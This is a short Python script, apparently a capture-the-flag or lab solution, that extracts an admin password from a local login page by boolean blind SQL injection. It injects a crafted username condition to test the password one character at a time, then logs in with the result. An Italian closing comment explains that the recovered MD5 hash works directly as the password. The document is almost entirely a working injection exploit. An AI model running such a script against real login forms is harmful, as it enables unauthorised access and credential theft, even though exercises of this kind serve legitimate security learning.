import requests
import string

url = "http://127.0.0.1:9090/login.php"
alphabet = list(string.printable)

def check_login(password):
	data = {
		"submit": "true",
		"username": "admin",
		"password": password
	}

	response = requests.post(url, data=data)

	return "ACCESS GRANTED" in response.text

password = ''
iter = 1
while iter <= 100:
	for i, a in enumerate(alphabet):
		data = {
			"submit": 'true',
			"username": f"admin' AND ASCII(SUBSTRING(password, {iter}, 1)) = {ord(a)}#",
			"password": "1"
		}

		response = requests.post(url, data=data)

		if "ACCESS GRANTED" in response.text:
			print(f"Step {i}: {a}\n{response.text}", flush=True)
			password += a
			break
	
	if check_login(password):
		break
		
	iter += 1

print(f"Password: {password}")
"""
Password: 21232f297a57a5a743894a0e4a801fc3
Utilizzo un cracker online: https://crackstation.net/
La password è stata codificata in md5
Password: admin
Prima di fare il confronto con la password salvata nel database, in md5,
la password inserita nel form non è stata codificata in md5. Pertanto,
21232f297a57a5a743894a0e4a801fc3 è la password in chiaro.
"""
